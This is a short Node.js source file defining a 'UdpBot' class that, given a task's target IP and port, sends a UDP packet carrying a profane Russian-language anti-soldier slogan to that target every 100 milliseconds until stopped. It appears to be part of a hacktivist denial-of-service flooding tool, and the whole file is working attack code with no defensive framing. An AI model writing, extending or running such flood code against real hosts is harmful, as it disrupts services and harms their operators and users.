import udp from 'dgram';

export class UdpBot {
  constructor(task) {
    this.ip = task.ip;
    this.port = task.port;
    this.active = true;
    this.client = null;
    this.timeoutId = 0;

    process.on('exit', this.destroy.bind(this))
  }

  start() {
    this.client = udp.createSocket('udp4');
    const data = Buffer.from('Русский солдат иди на хуй !');

    this.client.send(data, this.port, this.ip, (error) => {
      if (error) console.error(error);

      this.client.close();

      if (!this.active) return;

      this.timeoutId = setTimeout(this.start.bind(this), 1e2);
    });
  }

  destroy() {
    this.active = false;
    clearInterval(this.timeoutId);
  }
}
